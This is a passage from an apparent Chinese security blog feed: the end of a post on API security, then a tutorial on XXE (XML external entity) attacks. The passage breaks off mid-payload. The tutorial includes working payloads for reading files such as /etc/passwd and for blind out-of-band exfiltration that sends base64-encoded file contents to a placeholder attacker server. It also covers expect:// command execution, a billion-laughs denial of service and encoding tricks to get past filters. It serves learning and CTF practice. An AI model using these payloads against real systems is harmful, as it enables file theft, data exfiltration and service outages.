请求和响应，而日志记录涉及用安全、防篡改的方式记录 API 事件和活动。</li><li>API 测试： API 安全防护解决方案还涉及对 API 进行测试，以识别漏洞和潜在的安全风险。API 测试可以手动执行或使用自动化工具执行，有助于确保 API 安全无虞和按预期运行。</li><li>API 监控和运行时保护： API 安全防护解决方案必须对 API 行为进行监控。了解正常行为与异常滥用的区别是保护 API 免遭恶意攻击的重要部分。</li><li>漏洞管理： API 安全防护解决方案还涉及漏洞管理，这包括识别和解决 API 中的安全漏洞。漏洞管理可以包括漏洞扫描、修补和修复，可帮助防止攻击者利用 API 中的已知漏洞。</li></ul><p>Spring Security 的 REST API 与微服务安全（2024 最新版） <a href="https://developer.aliyun.com/article/1487156">https://developer.aliyun.com/article/1487156</a></p><p>我感觉其实web安全就是在对api进行测试，其实都是和后端进行交流，只是交流的语言方式不同罢了，所以测试方式也都类似，只是规范化的api会提供相应的词典，一定程度上更加方便了fuzz</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】XXE（XML External Entity）漏洞</title>
      <link href="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/"/>
      <url>/2024/09/24/WebSecurity/owasptop/xmlexternalentity/</url>
      
        <content type="html"><![CDATA[<p>CTF XXE <a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a><br>XXE漏洞利用技巧：从XML到远程代码执行 <a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>XXE（XML外部实体注入）是一种针对应用程序处理XML数据的方式的攻击。在这种攻击中，攻击者利用应用程序对XML输入的处理不当，引入或“注入”恶意内容。这可能导致未授权的数据访问、服务拒绝攻击甚至执行远程代码。</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML文档结构包括：XML声明、DTD文档类型定义（可选）、文档元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。<br>DTD一般认为有两种引用或声明方式：<br>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span></span><br></pre></td></tr></table></figure><p>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></pre></td></tr></table></figure><p>参数实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span></span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image.png"><br>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-1.png"></p><h2 id="XXE漏洞类型"><a href="#XXE漏洞类型" class="headerlink" title="XXE漏洞类型"></a>XXE漏洞类型</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>直接读取</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入外部实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>无回显的情况下</p><p>基于OOB(Out of Band的缩写，指安全数据不经过自己通信的信道进行传输)，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p><p>基于报错<br>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><ul><li>通过引入服务器文件：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xml.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%start;</span><br></pre></td></tr></table></figure></li><li>通过引入本地文件：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;send;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，只要是从外部引入DTD文件，并在其中定义一些实体内容就行。仔细看一下很好理解，第一个调用的参数实体是%remote，在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send。</li><li>嵌套参数实体<br>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%start;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>基于报错的三层嵌套参数实体XXE<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">para1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">para</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>        </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">firstname</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">firstname</span>&gt;</span><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>666<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。亦或者，如果目标是UNIX系统，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用&#x2F;dev&#x2F;random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h2 id="绕过XXE防护"><a href="#绕过XXE防护" class="headerlink" title="绕过XXE防护"></a>绕过XXE防护</h2><p>编码绕过：<code>ENTITY</code> <code>SYSTEM</code> <code>file</code> 等关键词被过滤，使用编码方式绕过：UTF-16BE：<code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code><br>协议绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">file://协议加文件上传</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php://filter协议加文件上传</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span 